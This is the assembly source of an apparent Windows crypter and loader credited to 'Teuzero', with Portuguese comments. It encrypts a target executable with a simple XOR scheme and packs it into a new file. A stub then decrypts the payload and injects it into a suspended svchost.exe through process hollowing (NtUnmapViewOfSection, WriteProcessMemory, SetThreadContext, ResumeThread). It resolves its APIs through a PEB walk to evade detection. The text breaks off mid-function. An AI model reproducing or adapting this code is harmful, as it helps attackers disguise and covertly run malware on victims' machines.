[BITS 64]
;**************
;* By:Teuzero *
;**************
global WinMain
section .bss 
    tamTotal                                        resq 8
    NameArgv0                                       resb 32
    AddressAlocadoV                                 resq 8
    addressAllocTarget                              resq 8
    addressAllocArv0                                resq 8
    addressCrypted                                  resq 8
    TamArqProgram                                   resq 8
    TamArqTarget                                    resq 8
    bufferFileName                                  resq 32
    bufferFileNameTarget                            resq 32
    GetSizeTarget                                   resq 8
    lpPebImageBase                                  resq 8
    allocex                                         resq 8
    alloc                                           resq 8
    lpImageBase                                     resq 16
    VA                                              resq 8
    PE                                              resq 16
    ImageBase                                       resq 16
    NumSecion                                       resq 8
    Ptrt                                            resq 8
    void                                            resq 8
    address750                                      resq 8
    NumSection                                      resq 8
    handle                                          resq 8
    BufferFileNameTarget                            resb 0x100
    address7ec                                      resd 1
    Ptrt0                                           resq 1
	
    struc CONTEXT
       .P1Home:                                     resq 1
       .P2Home:                                     resq 1
       .P3Home:                                     resq 1
       .P4Home:                                     resq 1
       .P5Home:                                     resq 1
       .P6Home:                                     resq 1
       .ContextFlags:                               resd 1
       .MxCsr:                                      resd 1
       .SegCs:                                      resw 1
       .SegDs:                                      resw 1
       .SegEs:                                      resw 1
       .SegFs:                                      resw 1
       .SegGs:                                      resw 1
       .SegSs:                                      resw 1
       .EFlags:                                     resd 1
       .Dr0:                                        resq 1
       .Dr1:                                        resq 1
       .Dr2:                                        resq 1
       .Dr3:                                        resq 1
       .Dr6:                                        resq 1
       .Dr7:                                        resq 1
       .Rax:                                        resq 1
       .Rcx:                                        resq 1
       .Rdx:                                        resq 1
       .Rbx:                                        resq 1
       .Rsp:                                        resq 1
       .Rbp:                                        resq 1
       .Rsi:                                        resq 1
       .Rdi:                                        resq 1
       .R8:                                         resq 1
       .R9:                                         resq 1
       .R10:                                        resq 1
       .R11:                                        resq 1
       .R12:                                        resq 1
       .R13:                                        resq 1
       .R14:                                        resq 1
       .R15:                                        resq 1
       .Rip:                                        resq 1
    endstruc
	
   struc PROCESSINFO
        .hProcess                                   resd 2
        .hThread                                    resd 2
        .dwProcessId                                resd 1
        .dwThreadId                                 resd 1
    endstruc
	     
   struc PROCESSINFO
        .hProcess                                    resd 2
        .hThread                                     resd 2
        .dwProcessId                                 resd 1
        .dwThreadId                                  resd 1
    endstruc
		
    struc STARTUPINFOA 
        .cb                                          resd 1
        .lpReserved                                  resb 8
        .lpDesktop                                   resb 8
        .lpTitle                                     resb 0xc
        .dwX                                         resd 1
        .dwY                                         resd 1
        .dwXSize                                     resd 1
        .dwYSize                                     resd 1
        .dwXCountChars                               resd 1
        .dwYCountChars                               resd 1
        .dwFillAttribute                             resd 1
        .dwFlags                                     resd 1
        .wShowWindow                                 resw 1
        .cbReserved2                                 resw 2
        .lpReserverd2                                resb 0xA
        .hStdInput                                   resd 2
        .hStadOutput                                 resd 2
        .hStdError                                   resd 2
    endstruc

section .rdata
	Ptrl                                         dq  0x0004000000000000
	process dq "svchost.exe",0,0

section .data
    ctx istruc CONTEXT
    iend

    ProcInfo istruc PROCESSINFO
    iend
   
   startup istruc STARTUPINFOA 
    iend 
	
    pt20                                             dq 20
    ptr17f0                                          dd 0x01
    
section codered
	;CodeRed times 80000000                             db 0:
	CodeRed:
	buffer times 800000 dq 0

section .text
WinMain:
    Start:
    ;***************
    ;**** START ****
    ;***************
    ;* By: Teuzero *
    ;***************

    ;Obtem o endereço base do kernel32.dll 
    call Locate_kernel32
    call IAT
    call FinFunctionGetProcAddress
    call LoadLibraryA
    call LoadMsvcrt
    call PrintMsgConsole
    call PegaNomeDoaquivo
    
	lea rax, [rsp+0x10]
    mov [bufferFileNameTarget], rax
    
	call ReadTarget
    call Locate_kernel32
	
    call VirtualProect
    ;CALL VirtualProtect 
    mov r10, [TamArqTarget]
    add r10, 0x77
    sub rsp, 0x30
    push rsp
    mov r9, rsp
    mov r8d, 0x40
    mov rdx, r10
    mov ecx, CodeRed
    sub rsp, 0x30
    call rsi
    add rsp, 0x30
	
    mov rdx,[TamArqTarget]
    mov rdi, [addressAllocTarget]
    mov rsi, CodeRed
    xor rcx,rcx
    Encrypt:
        mov rbx, [rdi]
        add rbx, 0xc
        xor rbx, 0xC0FFEE
        mov [rsi], rbx
		inc rdi
		inc rsi
        dec rdx
        cmp rdx,rcx
        jne Encrypt 
    
	mov rbx, "T007.exe"
	push rbx
	mov [rsp+0x8], byte 0x00
	lea rbx, [rsp]
	mov [bufferFileName], rbx
	call OpenFileArg0

    ;Lookup malloc
    mov rdi, "malloc"
    push rdi
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    add rsp, 0x30

    ;call malloc
    mov rcx, [TamArqProgram]
    sub rsp, 0x30
    call rax
    mov [addressCrypted], rax
    mov rdi, rax
    add rsp,0x30
    add rsp, 0x08
	
	
	mov rcx, [TamArqProgram]
	mov rdx, [addressCrypted]
	mov rdi, [addressAllocArv0]

	Copy:
		mov rsi, [rdi]
		mov [rdx], rsi
		inc rdi
		inc rdx
		dec rcx
		cmp rcx, 0x00
		jne Copy
	
	mov rdx, [addressCrypted]
	mov rdi, CodeRed
	add rdx, 0x400 
	
	mov rcx, [TamArqTarget]
	CopyTarget:
		mov rsi, [rdi]
		mov [rdx],rsi
		inc rdi
		inc rdx
		dec rcx
		cmp rcx, 0x00
		jne CopyTarget
	
	WriterCrypted:
        ;Lookup fopen
        mov rax, "fopen"
        push rax
        lea rdx, [rsp]
        mov rcx, r15
        sub rsp, 0x30
        call r14
        add rsp, 0x30
        add rsp, 0x08

        ;Abre arquivo
        mov rbx, "Tx0.exe"
        push rbx
        lea rcx, [rsp]
        mov rbx, "wb+"
        push rbx
        lea rdx, [rsp]
        sub rsp, 0x30
        call rax
	mov rsi, rax
	add rsp, 0x30
		
	;Lookup fwrite
        mov rax, "fwrite"
        push rax
        lea rdx, [rsp]
        mov rcx, r15
        sub rsp, 0x30
        call r14
	add rsp, 0x30
	add rsp, 0x08
		
	mov rbx, [addressCrypted]
	mov edx, dword [rbx+0x3c]
	add rbx, rdx
	add rbx, 0x28
	mov [rbx], dword 0x0061D000;0x04C4E000
		
        ;call fwrite
        xor r8,R8
        mov r8, [TamArqProgram]
        mov edx, r8d
        mov r9, rsi
        mov r8d, 0x01
        mov rcx, [addressCrypted]
        sub rsp, 0x30
        call rax
        add rsp, 0x30
        add rsp, 0x08
        ;Lookup fclose
        mov rax, "fclose"
        push rax
        lea rdx, [rsp]
        mov rcx, r15
        sub rsp, 0x30
        call r14
        add rsp, 0x30
        add rsp, 0x08
		
	;call fclose
	sub rsp,0x30
	mov rcx, rsi
	call r12
	add rsp, 0x30
	add rsp, 0x08
	
	dec:
        ;call decCode
    
	Exit:   
        call Locate_kernel32
        ;lookup ExitProcess
        mov rax, "ess"
        push rax
        mov rax, "ExitProc"
        push rax
        lea rdx, [rsp]
        mov rcx, r8
        sub rsp, 0x30
        call r14
        add rsp, 0x30
        add rsp, 0x10
        ;call ExitProcess
        mov r12 ,rax
        call r12
    ;END
ret
;***************
;*     AND     *
;***************

section deccode    
    decCode:
    call Locate_kernel32
    call IAT
    call FinFunctionGetProcAddress
    ;SHELLCODE DE CONEXÃO ENCRIPTADO
     
    call Locate_kernel32	 
    ;Lookup CreateProcessA
    mov rax, 0x41737365636f
    push rax
    mov rax, 0x7250657461657243
    push rax
    mov rdx, rsp
    mov rcx, r8
    sub rsp, 0x30
    call R14
    add rsp, 0x30
    add rsp, 0x10
    sub rsp, 0x238

    ;Call CreateProcessA, CRIA PROCESSO SVCHOST SUSPENSO
    lea rdx,[ProcInfo+PROCESSINFO.hProcess]
    mov [rsp+0x48], rdx
    xor rdx,rdx
    lea rdx ,[startup+STARTUPINFOA.cb]
    xor rdi,rdi
    xor r9,r9
    mov r9, 0x1
    xor r11,r11
    mov r11, 0x04
    mov rdi, 0x0000000000000000
    mov [rsp+0x40], rdx 
    mov [rsp+0x38], rdi
    mov [rsp+0x30], rdi
    mov [rsp+0x28], r11
    mov [rsp+0x20], r9
    mov r9d, 0
    mov r8d, 0
    lea rdx, [process]
    mov ecx, 0
    xor r10,r10
    call rax
    add rsp, 0x238
	
    call Locate_kernel32
    call GetProcAddres
	

    ;Lookup VirtualAlloc
    mov rax, "lloc"
    push rax
    mov rax, "VirtualA"
    push rax
    lea rdx, [rsp]
    mov rcx, r8
    sub rsp, 0x30
    sub rsp, 0x10
    call r14
   
    add rsp, 0x30
    add rsp, 0x10
    ;call VirtualAlloc
    mov r9d, 0x04
    mov r8d, 0x1000
    mov rdi, 800000;80000000 
    mov edx, edi
    mov ecx, 0x00
    call rax
	mov [AddressAlocadoV], rax
    mov rcx, [AddressAlocadoV]
	mov rdx, CodeRed
    mov r9, 800000;80000000 
	sub r9, 0x07
    DecArq:
        mov rax, [rdx]
        xor rax, 0xC0FFEE
        sub rax, 0xc
        mov [rcx],rax
        inc rcx
        inc rdx
        dec r9
        cmp r9, 0x00
        jne DecArq

    mov rax, [AddressAlocadoV]
    mov ebx,  dword[rax+0x3C]
    add rax, rbx
    add rax, 0x50
    mov ebx, [eax]
    mov [GetSizeTarget],ebx
¯   mov rax, [AddressAlocadoV]
    mov [lpImageBase], rax 
    mov edi, dword [rax+0x3c]
    add eax, edi
    mov [PE], rax
    add rax, 0x30
    mov rdi, [rax]
    mov [ImageBase], rdi
    call Locate_kernel32
    ;lookup GetThreadContext
    call GetThreadCx
    ;call GetThreadContext
    mov dword[ctx+CONTEXT.ContextFlags], 0x100002 
    mov rax, [ProcInfo+PROCESSINFO.hThread]
    lea rdx, [ctx+CONTEXT.P1Home]
    mov rcx, rax
    call r12
    ;Lookup ReadProcessMemory
    call ReadProcessMemory
    ;call ReadProcessMemory
    mov rdi, [ctx+CONTEXT.Rdx]
    mov edx, 0x10
    add rdi,rdx
    mov [void], rdi
    mov rdx, [void]
    lea rcx, [lpPebImageBase]
    xor rdi,rdi
    mov [rsp+0x20], rdi
    mov r9d, 0x08
    mov r8, Rcx
    mov rcx,[ProcInfo+PROCESSINFO.hProcess]
    call rax
	
    mov rax, [lpImageBase]
    xor rdi,rdi 
    mov edi, dword [rax+0x3c]
    add rax, rdi
    mov [PE], rax
    add rax, 0x38
    xor rdi, rdi
    mov edi, [eax]
    mov [VA], eax
    mov rax, [lpPebImageBase]
    mov rdi , [ImageBase]
    cmp rax,Rdi
    jne lpAllocatedBase 
    call Locate_ntdll
    ;Lookup ZwUnmapViewOfSection
    ;ZwUnmapViewOfSection
    mov rax, "tion"
    push Rax
    mov rax, "iewOfSec"
    push Rax
    mov rax, "NtUnmapV"
    push Rax
    lea rdx, [rsp]
    mov rcx, r8
    sub rsp, 0x30
    call r14 
    mov r12, rax
    add rsp, 0x30
    add rsp, 0x10
    ;call ZwUnmapViewOfSection
    mov rcx, [ProcInfo+PROCESSINFO.hProcess]
    mov rdx, [lpPebImageBase]
    call rax
    lpAllocatedBase:
        call Locate_kernel32
        call LoadLibrary
        mov rbx,rcx
        loadKernelbase:
            ;Load kernelbase.dll
            mov rax, "se.dll"     
            push rax
            mov rax, "kernelba"
            push rax
            mov rcx, rsp
            sub rsp, 0x30
            call rsi
            mov r15,rax
            add rsp, 0x30
            add rsp, 0x10
            call Locate_kernel32
            ;Lookup VirtualAllocEx
            call VirtualAllocEx
            ;call VirtualAllocEx
            mov rbx, [PE]
            mov ecx, dword[rbx+0x50]
            mov rdx, [ImageBase]
            mov r8d, ecx
            mov r9d, 0x3000
            mov [rsp+0x20], dword 0x40
            mov rcx, [ProcInfo+PROCESSINFO.hProcess]
            mov rdi, r13
            call rax
            mov [allocex],rax
            mov rax, [allocex]
            test rax,Rax
            sete al
            test al, al
            je pulo 
            pulo:
            mov rax,  [allocex]
            cmp rax, [lpPebImageBase]
            je Decisao1
            call Locate_kernel32 
            sub rsp, 0x80
			
            ;Lookup WriteProcess
            call WriteProcess
            lea r8, [allocex]
            mov rdx, [void]
            lea  rcx,[pt20]
            mov [rsp+0x20], Rcx
            mov r9d, 8
            mov rcx, [ProcInfo+PROCESSINFO.hProcess]
            call rax
            add rsp, 0x80
			
            Decisao1:
            mov rax, [PE]
            mov word[rax+0x5C], 2 ;Subsystem
            mov rax, [ImageBase]
            mov rdx, [ImageBase]
            cmp rdx,Rax
            je Writable
            mov rax, [PE]
            movzx eax, word[rax+0x16]
            movzx eax, ax
            and eax, 1
            test eax,eax
            je Pulo2
            Pulo2:
    Writable:
            call Locate_kernel32
            mov rax,  [PE]
            mov eax, dword[rax+0x28]
            mov edx,eax
            mov rax, [ImageBase]
            add rax,rdx
            mov[ctx+CONTEXT.Rcx], rax
            call Locate_kernel32
            call LoadLibrary
            ;call LoadLibrary
            mov r13, r15
            ;Load kernelbase.dll
            mov rax, "se.dll"     
            push rax
            mov rax, "kernelba"
            push rax
            mov rcx, rsp
            sub rsp, 0x30
            call rsi
            mov r15,rax
            add rsp, 0x30
            add rsp, 0x10
            call Locate_kernel32
            ;lookup SetThreadContext
            sub rsp, 0x80
            mov rax, "dContext"
            push Rax
            mov rax, "SetThrea" 
            push rax
            mov [rsp+0x10], dword 0x00
            lea rdx, [rsp]
            mov rcx, r8
            sub rsp, 0x30
            call R14
            add rsp,0x30
            add rsp,0x10
            add rsp, 0x80
            mov r12, rax
            ;call SetThreadContext
            mov rax, [ProcInfo+PROCESSINFO.hThread]
            lea rdx, [ctx+CONTEXT.P1Home]
            mov rcx, Rax
            call r12
            call Locate_kernel32
			
            ;Lookup WriteProcess
            call WriteProcess
            ;call WriteProcessMemory
            sub rsp, 0x80
            mov rbx, [PE]  
            mov r9d,dword[rbx+0x54]
            mov r8, [lpImageBase]
            mov rdx, [ImageBase]
            xor rbx,Rbx
            push rbx
            mov [rsp+0x20],rsp
            mov rcx, [ProcInfo+PROCESSINFO.hProcess]
            call rax
            add rsp, 0x80
            mov rbp, rax
            add rsp, 0x08
            call Locate_kernel32
			
            ;Lookup VirtualProectEx
            sub rsp, 0x80
            call VirtualProectEx
            mov rbx, [PE]
            mov r8d, dword[rbx+0x54]
            mov rdx, [ImageBase]
            push Rcx
            mov rcx,rsp
            mov [rsp+0x20],Rcx
            mov r9d, 0x02
            mov rcx, [ProcInfo+PROCESSINFO.hProcess]
            call r12
            add rsp, 0x80
            add rsp, 0x08
            mov rax, [lpImageBase]
            mov eax, [rax+0x3c]
            movsxd rdx,eax
            mov rax, [lpImageBase]
            add rax,Rdx
            add rax, 0x108
            mov [address750], rax
            mov [NumSection], dword 0x00
            jmp Final
        Delta:
			add rsp, 0x10
			
            call Locate_kernel32
            ;Lookup WriteProcess
            call WriteProcess
            ;call WriteProcess
            mov eax,[NumSection]
            movsxd rdx,eax
            mov rax, RDX
            shl rax,0x2
            add rax,Rdx
            shl rax, 0x3
            mov rdx, Rax
            mov rax, [address750]
            add rax, Rdx
            mov eax, dword[rax+0x10]
            mov r9d,eax
            mov eax, dword [NumSection]
            movsxd rdx,eax
            mov rax,Rdx
            shl rax,0x2
            add rax,Rdx
            shl rax, 0x3
            mov rdx,Rax
            mov rax, [address750]
            add rax,Rdx
            mov eax, dword[rax+0x14]
            mov edx,eax
            mov rax, [lpImageBase]
            add rax,Rdx
            mov r8, Rax
            mov eax, dword[NumSection]
            movsxd rdx, eax
            mov rax, Rdx
            shl rax, 0x2
            add rax,Rdx
            shl rax, 0x3
            mov rdx,Rax
            mov rax, [address750]
            add rax,Rdx
            mov eax, dword[rax+0xc]
            mov edx,eax
            mov rax, [ImageBase]
            add rax,Rdx
            mov rcx,Rax
            mov rax, [ProcInfo+PROCESSINFO.hProcess]
            lea rdx, [Ptrl]
            mov [rsp+0x20],rdx
            mov rdx,Rcx
            mov rcx, Rax
	    sub rsp, 0x410
            call R12
            add rsp, 0x410
	
            mov dword[ptr17f0], 0
            mov rax, [PE]
            movzx eax, word[rax+0x6]
            movzx eax, ax
            sub eax, 0x01
            cmp eax, [NumSection]
            jne Decisao2
            mov rax, [PE]
            mov ecx, [rax+0x50]
            mov eax, dword[NumSection]
            movsxd rdx,eax
            mov rax,rdx
            shl rax, 0x02
            add rax,Rdx
            shl rax, 0x3
            mov rdx, Rax
            mov rax, [address750]
            add rax,Rdx
            mov eax, dword [rax+0xc]
            sub ecx,eax
            mov eax,ecx
            mov dword[NumSection], eax
            jmp D4
        Decisao2:
            mov eax, dword[NumSection]
            cdqe
            lea rdx, [rax+1]
            mov rax,Rdx
            shl rax,0x02
            add rax,Rdx
            mov rax, [address750]
            add rax,Rdx
            mov ecx, dword [rax+0xC]
            mov eax, dword[NumSection]
            movsxd rdx,eax
            mov rax,Rdx
            shl rax, 0x02
            add rax,Rdx
            shl rax,0x03
            mov rdx,Rax
            mov rax, [address750]
            add rax,Rdx
            mov eax, dword[rax+0xc]
            sub ecx,eax
            mov eax, ecx
            mov dword[ptr17f0], eax
        D4:
            mov dword[address7ec], 0
            mov eax, dword[NumSection]
            movsxd rdx,eax
            mov rax,Rdx
            shl rax, 0x02
            add rax,Rdx
            shl rax, 0x03
            mov rdx,Rax
            mov rax, [address750]
            add rax, Rdx
            mov eax, dword[rax+0x24]
            and eax,  0x20000000
            test eax, eax 
            je D5
            mov eax, [NumSection]
            movsxd rdx,eax
            mov rax,Rdx
            shl rax,0x02
            add rax,Rdx
            shl rax, 0x03
            mov rdx,Rax
            mov rax, [address750]
            add rax,rdx
            mov eax, dword[rax+0x24]
            and eax , 0x40000000
            test eax,eax
            je D5
            mov eax, dword[NumSection]
            movsxd rdx,eax
            mov rax,Rdx
            shl rax, 0x02
            add rax,Rdx
            shl rax, 0x03
            mov rdx,Rax
            mov rax, [address750]
            add rax,Rdx
            mov eax, dword[rax+0x24]
            test eax,eax
            jns D5
            mov dword[address7ec],0x40
            jmp jmpAlloc
        D5:
            mov eax, dword[NumSection]
            movsxd rdx,eax
            mov rax,Rdx
            shl rax, 0x02
            add rax, Rdx
            shl rax, 0x03
            mov rdx,Rax
            mov rax, [address750]
            add rax,Rdx
            mov eax, dword[rax+0x24]
            and eax, 0x20000000
            test eax,eax
            je D6
            mov eax, dword[NumSection]
            movsxd rdx,eax
            mov rax,Rdx
            shl rax, 0x02
            add rax,Rdx
            shl rax, 0x03
            mov rdx,Rax
            mov rax, [address750]
            add rax, Rdx
            mov eax, dword[rax+0x24]
            and eax, 0x40000000
            test eax,eax
            je D6
            mov dword[address7ec],0x20
            jmp jmpAlloc
        D6:
        jmpAlloc:   
        call Locate_kernel32
        ;Lookup VirtualProectEx
        call VirtualProectEx
        ;call VirtualProectEx
        sub rsp, 0x80
        mov ecx, dword[ptr17f0]
        mov eax, dword[NumSection]
        movsxd rdx,eax
        mov rax,Rdx
        shl rax, 0x2
        add rax,Rdx
        shl rax,0x3
        mov rdx,Rax
        mov rax, [address750]
        add rax, Rdx
        mov eax, dword [rax+0xc]
        mov edx,eax
        mov rax, [ImageBase]
        add rax,Rdx
        mov r10,Rax
        mov rax, [ProcInfo+PROCESSINFO.hProcess]
        mov r8d, dword[address7ec]
        push rbx
        mov rbx,rsp
        mov [rsp+0x20],rbx
        mov r9d, r8d
        mov r8, Rcx
        mov rdx,r10
        mov rcx, Rax
        call r12
        add rsp, 0x80
        sub rsp, 0x10
	add rsp, 0x8
        add dword [NumSection], 0x1
    Final:
        mov rax, [PE]
        movzx eax, word[rax+0x06]
        movzx eax, ax
        cmp eax, [NumSection]   
        jg Delta
		
        call Locate_kernel32 
        ;Lookup ResumeTheread
        mov rax, "read"
        push rax
        mov rax, "ResumeTh"
        push rax
        lea rdx, [rsp]
        mov rcx, r8
        sub rsp, 0x30
        call r14
        add rsp, 0x30
        add rsp, 0x10
        mov r12, rax
        ;call ResumeTheread
        mov rax, [ProcInfo+PROCESSINFO.hThread]
        mov rcx, rax
        call R12
	add rsp, 0x10
		
ret         




PrintMsgConsole:
    ;Lookup printf
    mov rdi, "printf"
    push rdi
    mov rdx, rsp
    mov rcx, r15
    sub rsp, 0x30
    call r14
    add rsp, 0x30
    add rsp, 0x08
    mov r12, rax

    ;call printf
    mov rdi, ":"
    push rdi
    mov rdi, "[+] File"
    push rdi
    lea rcx, [rsp]
    sub rsp, 0x30
    call rax
    add rsp, 0x30
    add rsp, 0x10
retn

PegaNomeDoaquivo:
    ;Lookup scanf
    mov rdi, "scanf"
    push rdi
    mov rdx,rsp
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30

    ;call scanf
    lea rdi, [rsp+0x20]
    mov rdx, rdi
    mov rbx, "%s"
    push rbx
    lea rcx, [rsp]
    sub rsp, 0x30
    call rax
    add rsp, 0x30
    add rsp, 0x10
ret

ReadTarget:
 ;Lookup fopen
    mov rax, "fopen"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12,rax
    add rsp, 0x30

    ;Abre arquivo
    mov rax, [bufferFileNameTarget]
    lea rcx, [rax]
    mov rax, "rb"
    push rax
    lea rdx, [rsp]
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    mov rbx,rax
    add rsp, 0x10

LocomoveParaOFimDoarquivoTarget:
    ;Lookup fseek
    mov rax, "fseek"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12,rax
    add rsp, 0x30

    ;call fseek
    mov rcx, rbx
    mov r8d, dword 0x02        
    mov edx, dword 0x00
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    add rsp, 0x08
GetSizeFileTarget:
    ;Lookup ftell
    mov rax, "ftell"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    add rsp, 0x30
    mov r12,rax

    ;call ftell
    mov rcx, rbx
    sub rsp, 0x30
    call r12
    mov [TamArqTarget], rax
    add rsp,0x30
    mov rsi,rax
    add rsp, 0x08

AlocaEspacoEmUmEnderecoTarget:
    ;Lookup malloc
    mov rax, "malloc"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12,rax
    add rsp, 0x30

    ;call malloc
    mov rcx, rsi
    sub rsp, 0x30
    call r12
    mov [addressAllocTarget], rax
    mov rdi, rax
    add rsp,0x30
    add rsp, 0x08

MoveParaInicioDoArquivoTarget:
    ;Lookup rewind
    mov rax, "rewind"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30

    ;call rewind
    mov rcx, rbx
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    add rsp, 0x08

GravaOPEdoArquivoNoEnderecoAlocadoPorMallocTarget:
    ;Lookup fread
    mov rax, "fread"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30

    ;call fread
    mov edx,esi
    mov r9, rbx
    mov r8d, 0x01
    mov rcx, rdi
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    add rsp, 0x08

FechaArquivoTarget:
    ;Lookup fclose
    mov rax, "fclose"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30

    ;call fclose
    sub rsp,0x30
    mov rcx, rbx
    call r12
    add rsp, 0x30
    add rsp, 0x08
 ret
 
 
 
 OpenFileArg0:
   ;Lookup fopen
    mov rax, "fopen"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12,rax
    add rsp, 0x30

    ;Abre arquivo
    mov rax, [bufferFileName]
    lea rcx, [rax]
    mov rax, "rb"
    push rax
    lea rdx, [rsp]
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    mov rbx,rax
    add rsp, 0x10

LocomoveParaOFimDoarquivo:
    ;Lookup fseek
    mov rax, "fseek"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12,rax
    add rsp, 0x30

    ;call fseek
    mov rcx, rbx
    mov r8d, dword 0x02        
    mov edx, dword 0x00
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    add rsp, 0x08
GetSizeFile:
    ;Lookup ftell
    mov rax, "ftell"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    add rsp, 0x30
    mov r12,rax

    ;call ftell
    mov rcx, rbx
    sub rsp, 0x30
    call r12
    mov [TamArqProgram], rax
    add rsp,0x30
    mov rsi,rax
    add rsp, 0x08

AlocaEspacoEmUmEndereco:
    ;Lookup malloc
    mov rax, "malloc"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12,rax
    add rsp, 0x30

    ;call malloc
    mov rcx, rsi
    sub rsp, 0x30
    call r12
    mov [addressAllocArv0], rax
    mov rdi, rax
    add rsp,0x30
    add rsp, 0x08

MoveParaInicioDoArquivo:
    ;Lookup rewind
    mov rax, "rewind"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30

    ;call rewind
    mov rcx, rbx
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    add rsp, 0x08

GravaOPEdoArquivoNoEnderecoAlocadoPorMalloc:
    ;Lookup fread
    mov rax, "fread"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30

    ;call fread
    mov edx,esi
    mov r9, rbx
    mov r8d, 0x01
    mov rcx, rdi
    sub rsp, 0x30
    call r12
    add rsp, 0x30
    add rsp, 0x08

FechaArquivo:
    ;Lookup fclose
    mov rax, "fclose"
    push rax
    lea rdx, [rsp]
    mov rcx, r15
    sub rsp, 0x30
    call r14
    mov r12, rax
    add rsp, 0x30

    ;call fclose
    sub rsp,0x30
    mov rcx, rbx
    call r12
    add rsp, 0x30
    add rsp, 0x08
 ret

;********************************
;* ABAIXO BUSCA POR FUNÇÕES     *
;********************************
; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
FinFunctionGetProcAddress:
    mov rcx, r10; # Set loop counter
    kernel32findfunction:  
        jecxz FunctionNameFound; # Percorra esta função até encontrarmos GetProcA
        xor ebx,ebx;             # Zera EBX para ser usada
        mov ebx, [r11+4+rcx*4];  # EBX = RVA para o primeiro AddressOfName
        add rbx, r8;             # RBX = Nome da funcao VMA
        dec rcx;                 # Decrementa o loop em 1
        mov rax, 0x41636f7250746547; # GetProcA
        cmp [rbx], rax;          # checa se rbx é igual a  GetProcA
        jnz kernel32findfunction;  

    ;Encontra o endereço da função de GetProcessAddress
    FunctionNameFound:                 
        ;We found our target
        xor r11, r11; 
        mov r11d, [rdx+0x24];    # AddressOfNameOrdinals RVA
        add r11, r8;             # AddressOfNameOrdinals VMA
        ;Get the function ordinal from AddressOfNameOrdinals
        inc rcx; 
        mov r13w, [r11+rcx*2];   # AddressOfNameOrdinals + Counter. RCX = counter
        ;Get function address from AddressOfFunctions
        xor r11, r11; 
        mov r11d, [rdx+0x1c];    # AddressOfFunctions RVA
        add r11, r8;             # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
        mov eax, [r11+4+r13*4];  # Get the function RVA.
        add rax, r8;             # Add base address to function RVA
        mov r14, rax;            # GetProcAddress to R14
ret

LoadLibraryA:
   ;pega o endereco LoadLibraryA usando GetProcAddress
    mov rcx, 0x41797261;  
    push rcx;  
    mov rcx, 0x7262694c64616f4c;  
    push rcx;  
    mov rdx, rsp;            # joga o ponteiro da string LoadLibraryA para RDX
    mov rcx, r8;             # Copia o endereço base da Kernel32  para RCX
    sub rsp, 0x30;           # Make some room on the stack
    call r14;                # Call GetProcessAddress
    add rsp, 0x30;           # Remove espaço alocado na pilha
    add rsp, 0x10;           # Remove a string alocada de  LoadLibrary 
    mov rsi, rax;            # Guarda o endereço de loadlibrary em RSI
ret

LoadMsvcrt:
    ;Load msvcrt.dll
    mov rax, "ll"
    push rax
    mov rax, "msvcrt.d"
    push rax
    mov rcx, rsp
    sub rsp, 0x30
    call rsi
    mov r15,rax
    add rsp, 0x30
    add rsp, 0x10
ret      

GetProcAddres:
    xor r11,r11
    xor r13,r13
    xor rcx, rcx;                     # Zera RCX
    mov rax, gs:[rcx + 0x60];         # 0x060 ProcessEnvironmentBlock to RAX.
    mov rax, [rax + 0x18];            # 0x18  ProcessEnvironmentBlock.Ldr Offset
    mov rsi, [rax + 0x20];            # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
    lodsq;                            # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
    xchg rax, rsi;                    # troca RAX,RSI
    lodsq;                            # Load qword at address (R)SI into RAX
    mov rbx, [rax + 0x20] ;           # RBX = Kernel32 base address
    mov r8, rbx;                      # Copia o endereco base do Kernel32 para o registrador R8
      
    ;Código para chegar na tabela de endereco de exportacao
    mov ebx, [rbx+0x3C];              # obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
    add rbx, r8;                      # Add defrerenced signature offset to kernel32 base. Store in RBX.
    mov r12, 0x88FFFFF;      
    shr r12, 0x14; 
    mov edx, [rbx+r12];               # Offset from PE32 Signature to Export Address Table (NULL BYTE)
    add rdx, r8;                      # RDX = kernel32.dll + RVA ExportTable = ExportTable Address
    mov r10d, [rdx+0x14];             # numero de funcoes
    xor r11, r11;                     # Zera R11 para ser usado 
    mov r11d, [rdx+0x20];             # AddressOfNames RVA
    add r11, r8;                      # AddressOfNames VMA

FinFunctionGetProcAddress2:
    mov rcx, r10;                     # Set loop counter
    kernel32findfunction2:  
        jecxz FunctionNameFound2;     # Percorra esta função até encontrarmos GetProcA
        xor ebx,ebx;                  # Zera EBX para ser usada
        mov ebx, [r11+4+rcx*4];       # EBX = RVA para o primeiro AddressOfName
